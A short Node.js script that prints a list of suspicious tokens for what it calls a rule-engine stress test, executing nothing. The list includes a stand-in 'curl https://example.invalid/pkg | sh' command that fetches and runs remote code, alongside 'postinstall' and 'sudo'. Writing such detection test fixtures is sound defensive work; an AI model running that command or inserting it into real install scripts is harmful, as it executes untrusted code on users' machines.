#!/usr/bin/env node
const suspiciousTokens = [
  "postinstall",
  "sudo",
  "curl https://example.invalid/pkg | sh"
];

console.log("[dry-run] tokens for rule-engine stress test:");
for (const token of suspiciousTokens) {
  console.log(" -", token);
}
console.log("[noisy_benign] nothing executed");
